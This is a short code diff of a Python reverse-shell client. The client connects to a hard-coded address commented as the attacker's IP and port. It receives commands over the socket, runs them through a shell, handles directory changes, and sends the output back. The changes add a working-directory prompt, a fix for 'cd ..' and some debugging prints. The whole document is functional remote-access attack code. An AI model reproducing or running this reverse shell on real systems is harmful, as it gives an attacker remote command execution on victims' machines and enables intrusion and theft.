@@ -4,19 +4,32 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '192.168.0.109'
-port = 1234
+host = '192.168.0.109' # attacker's IP
+port = 1234 # attacker's port
 
 s.connect((host, port))
 
 while True:
+    currDir = os.getcwd() + "> "
+    s.send(str.encode(currDir))
     resp = s.recv(1024)
     data = resp.decode("utf-8")
+    output_str = ""
+    print(">> "+data) # debugging step
     if data[:2] == "cd":
-        os.chdir(data[3:])
-    elif len(data) > 0:
+        newPath = data[3:]
+        if data[3:] == "..":
+            slash = "/"
+            parts = os.getcwd().split(slash)
+            newPath = slash.join(parts[:-1])
+        if len(newPath) > 0:
+            os.chdir(newPath)
+    else:
         cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte, "utf-8")
-        currDir = os.getcwd() + "> "
-        s.send(str.encode(output_str))
+    if output_str == "":
+        output_str = "no-output"
+    print("output: "+output_str) # debugging step
+    s.send(str.encode(output_str))
+    s.recv(1024)
